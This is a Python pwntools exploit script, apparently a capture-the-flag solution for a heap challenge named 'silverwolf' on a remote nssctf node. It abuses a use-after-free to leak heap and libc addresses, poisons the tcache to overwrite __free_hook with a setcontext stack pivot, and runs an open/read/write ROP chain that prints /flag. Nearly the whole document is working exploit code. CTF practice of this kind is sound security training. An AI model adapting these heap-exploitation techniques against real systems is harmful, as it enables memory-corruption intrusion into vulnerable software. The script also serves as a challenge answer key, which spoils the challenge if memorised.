from pwn import *
import sys
remote_addr = ["node4.anna.nssctf.cn",28847]
libc = ELF('./libc-2.27.so')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./silverwolf_patched")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 0

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

debug('''
    b *$rebase(0xdf1)
    b *$rebase(0xea9)
    b *$rebase(0xf27)
''')

def menu(idx):
    sla(b'choice: ', str(idx).encode())

def add(size):
    menu(1)
    sla(b'Index: ', str(0).encode())
    sla(b'Size: ', str(size).encode())

def delete():
    menu(4)
    sla(b'Index: ',str(0).encode())

def edit(content):
    menu(2)
    sla(b'Index: ', str(0).encode())
    sla(b'Content: ', content)

def show():
    menu(3)
    sla(b'Index: ', str(0).encode())

add(0x78)
delete()
show()

ru(b'Content: ')
heap_base = u64(rc(6).ljust(8, b'\x00')) - 0x11b0
pr('heap_base', heap_base)

edit(p64(heap_base + 0x10))
add(0x78)
add(0x78)

for i in range(7):
    delete()
    edit(p64(0) * 2)

delete()
show()
libc.address = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x70 - libc.sym['__malloc_hook']
pr('libc.address', libc.address)

edit(b'\x00' * 0x78)

rdi = libc.address + 0x215bf
rsi = libc.address + 0x23eea
rdx = libc.address + 0x1b96
rax = libc.address + 0x43ae8
ret = libc.address + 0x8aa
rsp = libc.address + 0x3960
read = libc.sym['read']
write = libc.sym['write']
free_hook = libc.sym['__free_hook']
mov_rsp_rdi = libc.sym['setcontext'] + 53
syscall = read + 0xf

add(0x10)
edit(b'/flag\x00')

flag = heap_base + 0xe00
rop1 = p64(rdi) + p64(flag) + p64(rsi) + p64(0) + p64(rax) + p64(2) + p64(syscall)
rop1 += p64(rdi) + p64(3) + p64(rsp) + p64(heap_base + 0x1500)
rop2 = p64(rsi) + p64(heap_base + 0x300) + p64(rdx) + p64(0x30) + p64(read)
rop2 += p64(rdi) + p64(1) + p64(rsi) + p64(heap_base + 0x300) + p64(write)

add(0x60)
edit(rop1)
add(0x60)
edit(rop2)

add(0x10)
delete()
edit(p64(free_hook + 0xa0))
add(0x10)
add(0x10)
edit(p64(heap_base + 0xe20) + p64(ret))

add(0x60)
delete()
edit(p64(free_hook))
add(0x60)
add(0x60)
edit(p64(mov_rsp_rdi))

delete()

shell()
